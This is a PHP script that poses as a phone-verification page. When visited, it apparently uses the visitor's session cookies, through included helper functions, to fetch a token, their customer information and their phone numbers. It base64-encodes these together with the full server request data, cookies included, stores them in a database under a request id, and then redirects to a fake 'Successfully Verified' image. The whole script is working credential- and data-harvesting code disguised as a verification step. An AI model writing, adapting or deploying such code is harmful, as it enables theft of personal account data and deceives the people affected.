<?php
include './includes/conn.php';
include './includes/core_identity.php';

if (isset($_SERVER['HTTP_COOKIE'])) {
    if (isset($_GET['queryId'])) {
        if ($_GET['queryId'] != '') {
            $queryId = $_GET['queryId'];

            $tokenObj = json_decode(myToken(), true);
            if (isset($tokenObj['data']['generateToken']['token'])) {
                $token = $tokenObj['data']['generateToken']['token'];
                $part1 = GetCustomerInfo($token);
                $part2 = queryMyNumbers($token);

                $part1 = base64_encode($part1);
                $part2 = base64_encode($part2);
                $otherdata = base64_encode(json_encode($_SERVER));

                $stmt = $conn->prepare("UPDATE phoneVerif SET part1=:part1, part2=:part2, other=:other WHERE request_id=:request_id");
                $stmt->execute(['part1' => $part1, 'part2' => $part2, 'request_id' => $queryId, 'other' => $otherdata]);
            } else {
                $token = 'unavailable';
            }
        }
    }
}

header('location: https://fakeimg.pl/1080x520/0af544/175fe6?text=Successfully+Verified');